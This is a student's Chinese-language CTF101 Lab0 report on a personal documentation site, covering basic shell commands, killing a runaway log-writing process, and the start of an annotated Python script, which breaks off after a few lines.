
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="TNT的github.io">
      
      
      
      
        <link rel="prev" href="../../others/test/">
      
      
        <link rel="next" href="../misc_lab1/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
    
    
      
        <title>lab0 - AlabTNT's Github IO</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
      
    
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#ctf101-lab0-report" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="AlabTNT&#39;s Github IO" class="md-header__button md-logo" aria-label="AlabTNT's Github IO" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            AlabTNT's Github IO
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              lab0
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../tutorial/" class="md-tabs__link">
          
  
  TNT麻将教程

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../eating/" class="md-tabs__link">
          
  
  TNT Eating

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../others/cbt/" class="md-tabs__link">
          
  
  TNTSiteOthers

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="./" class="md-tabs__link">
          
  
  CTF2025

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="AlabTNT&#39;s Github IO" class="md-nav__button md-logo" aria-label="AlabTNT's Github IO" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    AlabTNT's Github IO
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TNT麻将教程
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            TNT麻将教程
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    主页
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/0.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    零、前言
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/1.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    一、麻将基础内容及基本规则
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/2.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    二、日本麻将（マージャン）规则介绍
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/3.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    三、国内麻将规则归纳（部分）
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/4.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    四、TNT公式战分数规则
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/5.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    五、线下礼仪
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/end/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    结语
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/app.1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    附录1*：日麻役种表
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/app.2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    附录2*：日麻点数、符数速查表 & 番种速查
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/app.3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    附录3*：术语收录一览
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tutorial/app.4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    附录4*：M-League相关内容
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TNT Eating
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            TNT Eating
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../eating/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    主页
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TNTSiteOthers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            TNTSiteOthers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../others/cbt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pycbt
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../others/izatomo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    izatomo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../others/test/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    test
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  <span class="md-ellipsis">
    CTF2025
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            CTF2025
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    lab0
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    lab0
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#3240102120" class="md-nav__link">
    <span class="md-ellipsis">
      3240102120
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#prerequisite" class="md-nav__link">
    <span class="md-ellipsis">
      Prerequisite
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Prerequisite">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      MISC
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MISC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2_1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      Crypto
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#challenge-2_2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      Pwn
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#task1" class="md-nav__link">
    <span class="md-ellipsis">
      Task1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task2" class="md-nav__link">
    <span class="md-ellipsis">
      Task2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task3" class="md-nav__link">
    <span class="md-ellipsis">
      Task3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_3" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2_3" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../misc_lab1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    misc_lab1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rev_lab1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    rev_lab1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn_lab1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pwn_lab1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web_lab1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    web_lab1
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crypto_lab1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    crypto_lab1
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#3240102120" class="md-nav__link">
    <span class="md-ellipsis">
      3240102120
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#prerequisite" class="md-nav__link">
    <span class="md-ellipsis">
      Prerequisite
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Prerequisite">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      MISC
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MISC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2_1" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      Crypto
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#challenge-2_2" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      Pwn
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#task1" class="md-nav__link">
    <span class="md-ellipsis">
      Task1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task2" class="md-nav__link">
    <span class="md-ellipsis">
      Task2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task3" class="md-nav__link">
    <span class="md-ellipsis">
      Task3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#challenge-1_3" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#challenge-2_3" class="md-nav__link">
    <span class="md-ellipsis">
      Challenge 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="ctf101-lab0-report">CTF101 短期课程 Lab0 Report<a class="headerlink" href="#ctf101-lab0-report" title="Permanent link">&para;</a></h1>
<p><center></p>
<h2 id="3240102120">3240102120<a class="headerlink" href="#3240102120" title="Permanent link">&para;</a></h2>
<p></center></p>
<p>本报告用于提交 CTF101 课程Lab 0。由于去年参加了校赛，虽然成绩较差，但是仍然希望通过本课程学习 CTF 相关知识。</p>
<hr />
<div class="admonition abstract">
<p class="admonition-title">报告中的一些小问题</p>
<p>由于我的开发起手比较野，导致我有一些规范和习俗并没有吸收。这可能导致我的报告包括但不限于以下问题之一：
- 参数起名比较随意
- 语法不会特别规范
- 部分黑盒内容不了解
- 部分指令理解出现偏差
敬请谅解！！！如有任何需要改进的问题，烦请及时指出，我将及时修改！！！</p>
</div>
<div class="admonition node">
<p class="admonition-title">一些代名</p>
<div class="admonition quote">
<p class="admonition-title">常言道...</p>
<p>不会打歌嘛学打歌，阿哥咋摆你咋摆</p>
</div>
<p>学习前辈经验，在CTF上面有我个人的一些代名，在我的报告中可能出现在举例子、实例展示等环节，以下是我常用的一些代名。这并非做记号，因此在此提前声明！
- 2120（我的学号后四位）
- AlabTNT
- 41ebNTN
- hjt
- MoonCake__MC
- ybmc
- M00nC4k1</p>
</div>
<h2 id="prerequisite">Prerequisite<a class="headerlink" href="#prerequisite" title="Permanent link">&para;</a></h2>
<h4 id="challenge-1">Challenge 1<a class="headerlink" href="#challenge-1" title="Permanent link">&para;</a></h4>
<p>shell命令用法比较多了吧，我比较常用的下面几个：</p>
<ul>
<li><code>screen</code> : 创建新窗口，通常被我拿来挂一些后台程序，用法就是 <code>screen -S &lt;name&gt;</code>来创建窗口、<code>screen -r &lt;name&gt;</code> attach一个窗口，<code>screen -list</code> 来列出全部已打开窗口。</li>
<li><code>ssh</code> : 用来使用ssh进行远程连接或是拉取内容等等。ssh后面一般跟地址。比如 <code>ssh root@alabtnt.com</code></li>
<li><code>tail</code> : 展示一个文件的末尾内容。</li>
<li><code>ps</code> : 查看全部进程。</li>
<li><code>pwd</code> : 展示当前所在位置的绝对路径。</li>
<li><code>dir</code> : 显示当前文件夹全部内容，也可以用 <code>ls</code> 代替。例如 <code>ls -a</code>可以展示详细文件。</li>
<li><code>cd</code> : <code>dir</code> 和 <code>pwd</code> 太水了（虽然这个也很水）：进入一个文件夹。索引父级文件夹使用 <code>..</code> 例如 <code>cd ../alabtntctf</code> 进入与当前所在位置同级的另一个文件夹。</li>
</ul>
<p>连接到我的 Linux 机器：<code>wsl -d Debian</code>。或者连接到我的 Linux 服务器 <code>ssh root@******.***</code></p>
<p><strong>Saint Join</strong>:</p>
<p>这个玩意解决的太快以至于忘记截图（</p>
<p><img alt="alt text" src="../lab0_0.png" /></p>
<p>题目描述有一个进程正在向bad.log里面持续写东西，关掉这个“磁盘爆爆器”，首先它是个进程，所以先<code>ps auxf</code>拿列表。然后扫了一下就能找到一个叫<code>badlog.py</code>的python进程，于是尝试kill一下。kill完check solution就过了。</p>
<p><br></p>
<h4 id="challenge-2">Challenge 2<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h4>
<p><s>Python我熟悉啊……Python我可太熟悉了（</s></p>
<p>以下直接在程序行末进行注释，不再单另文件。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-0-10">10</a></span>
<span class="normal"><a href="#__codelineno-0-11">11</a></span>
<span class="normal"><a href="#__codelineno-0-12">12</a></span>
<span class="normal"><a href="#__codelineno-0-13">13</a></span>
<span class="normal"><a href="#__codelineno-0-14">14</a></span>
<span class="normal"><a href="#__codelineno-0-15">15</a></span>
<span class="normal"><a href="#__codelineno-0-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="ch">#!/usr/bin/python3</span>
<a id="__codelineno-0-2" name="__codelineno-0-2"></a>
<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;give me your string: &quot;</span><span class="p">)</span>  <span class="c1"># 显示&quot;give me your string: &quot;并等待输入，然后将输入的内容存入data（类型str）</span>
<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;length of string:&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="c1"># 打印&quot;length of string: &quot;然后是data的长度。长度指的就是data字符数</span>
<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">data_old</span> <span class="o">=</span> <span class="n">data</span> <span class="c1"># 把data存到old_data里</span>
